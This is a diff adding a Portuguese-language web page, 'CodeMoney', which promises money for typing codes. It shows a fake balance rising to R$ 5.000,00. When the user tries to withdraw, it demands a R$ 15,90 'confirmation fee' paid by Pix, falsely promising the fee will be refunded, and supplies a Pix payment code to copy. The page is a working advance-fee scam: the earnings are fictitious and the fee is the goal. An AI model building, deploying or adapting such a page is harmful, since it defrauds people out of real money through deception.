@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CodeMoney | Simulador</title>
+
+<style>
+:root {
+    --bg: #ffffff;
+    --surface: #f8f9fa;
+    --text-primary: #1a1a1a;
+    --text-secondary: #6b7280;
+    --border: #e5e7eb;
+    --accent: #000000;
+}
+
+body {
+    background-color: var(--bg);
+    color: var(--text-primary);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+}
+
+/* HEADER */
+header {
+    position: absolute;
+    top: 0;
+    width: 100%;
+    padding: 30px 50px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-sizing: border-box;
+    border-bottom: 1px solid var(--border);
+}
+
+.brand { font-weight: 900; font-size: 1.4rem; }
+
+.balance-box { text-align: right; }
+.balance-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; }
+#balance-value { font-size: 1.6rem; font-weight: 800; }
+
+/* CARD */
+.card {
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+    padding: 20px;
+}
+
+#code-display {
+    font-size: 3rem;
+    font-weight: 900;
+    letter-spacing: 8px;
+    margin-bottom: 30px;
+    background: var(--surface);
+    padding: 25px;
+    border-radius: 15px;
+    border: 1px solid var(--border);
+}
+
+input {
+    width: 100%;
+    padding: 18px;
+    border-radius: 12px;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    font-size: 1.1rem;
+    text-align: center;
+}
+
+/* MODAL FINAL */
+.overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    justify-content: center;
+    align-items: center;
+    backdrop-filter: blur(4px);
+}
+
+.modal-box {
+    background: #fff;
+    padding: 40px;
+    border-radius: 20px;
+    text-align: center;
+    border: 1px solid var(--border);
+    box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
+    width: 90%;
+    max-width: 400px;
+}
+
+button {
+    background: #000;
+    color: #fff;
+    border: none;
+    padding: 15px;
+    border-radius: 10px;
+    font-weight: bold;
+    cursor: pointer;
+    width: 100%;
+    margin-top: 20px;
+}
+
+/* TELA PAGAMENTO */
+#payment-screen {
+    background: #000;
+    color: #fff;
+    flex-direction: column;
+    text-align: center;
+    padding: 30px;
+}
+
+.pix-box {
+    background: #111;
+    padding: 15px;
+    margin: 20px 0;
+    border-radius: 8px;
+    border: 1px solid #333;
+    font-family: monospace;
+    color: #00ff00;
+    font-size: 0.85rem;
+    word-break: break-all;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="brand">CODEMONEY</div>
+    <div class="balance-box">
+        <div class="balance-label">Saldo em conta</div>
+        <div id="balance-value">R$ 0,00</div>
+    </div>
+</header>
+
+<div class="card">
+    <h3>GANHE DINHEIRO DIGITANDO CÓDIGOS</h3>
+    <div id="code-display">------</div>
+    <input type="text" id="user-input" placeholder="Digite o código" autocomplete="off">
+</div>
+
+<!-- MODAL FINAL -->
+<div id="finish-modal" class="overlay">
+    <div class="modal-box">
+        <h2>Parabéns!</h2>
+        <p>Você atingiu o objetivo de hoje.</p>
+        <div style="font-size:2rem;font-weight:900;margin:20px 0;">R$ 5.000,00</div>
+        <button onclick="showPayment()">SACAR VALOR</button>
+    </div>
+</div>
+
+<!-- TELA PAGAMENTO -->
+<div id="payment-screen" class="overlay">
+    <div class="modal-box" style="background:#0a0a0a;color:#fff;">
+        <h2 style="color:#ffcc00;">⚠️ AVISO DE PAGAMENTO</h2>
+        <p>Para sacar esse valor você precisa pagar uma taxa de confirmação de saque no valor de <strong>R$ 15,90. Esse valor será devolvido. Após a confirmação de pagamento da taxa você poderá inserir sua chave pix para receber seu saque e a devolução do valor pago na taxa. Para fazer o pagamento da taxa basta copiar o código a baixo e colar na sua área de transferência da sua conta bancária e assim efetuar o pagamento</strong>.</p>
+        <div class="pix-box" id="pixCode">
+00020101021226870014br.gov.bcb.pix2565qrcode.santsbank.com/dynamic/16111b45-c4b8-45b9-a518-80e57ced46025204000053039865802BR5908RSA LTDA6009Sao Paulo62070503***6304A287
+        </div>
+        <button onclick="copyPix()">COPIAR CÓDIGO</button>
+        <button onclick="location.reload()" style="background:#444;">Cancelar</button>
+    </div>
+</div>
+
+<script>
+let currentBalance = 0;
+let codesDone = 0;
+const totalCodes = 5;
+const maxMoney = 5000;
+let currentCode = "";
+
+const display = document.getElementById('code-display');
+const input = document.getElementById('user-input');
+const balanceEl = document.getElementById('balance-value');
+
+function generateCode() {
+    const chars = "123456789ABCDEF";
+    let result = "";
+    for (let i = 0; i < 6; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    currentCode = result;
+    display.innerText = currentCode;
+}
+
+function animateValue(start, end, duration) {
+    let startTimestamp = null;
+    const step = (timestamp) => {
+        if (!startTimestamp) startTimestamp = timestamp;
+        const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+        const value = progress * (end - start) + start;
+        balanceEl.innerText = "R$ " + value.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+        if (progress < 1) window.requestAnimationFrame(step);
+    };
+    window.requestAnimationFrame(step);
+}
+
+input.addEventListener('input', () => {
+    if (input.value.toUpperCase() === currentCode) {
+        codesDone++;
+        let oldBalance = currentBalance;
+        currentBalance = (codesDone / totalCodes) * maxMoney;
+        input.value = "";
+        animateValue(oldBalance, currentBalance, 800);
+
+        if (codesDone < totalCodes) {
+            generateCode();
+        } else {
+            setTimeout(() => {
+                document.getElementById("finish-modal").style.display = "flex";
+            }, 600);
+        }
+    }
+});
+
+function showPayment() {
+    document.getElementById("finish-modal").style.display = "none";
+    document.getElementById("payment-screen").style.display = "flex";
+}
+
+function copyPix() {
+    const pixText = document.getElementById("pixCode").innerText;
+    navigator.clipboard.writeText(pixText).then(() => {
+        alert("Código copiado!");
+    });
+}
+
+generateCode();
+</script>
+
+</body>
+</html>
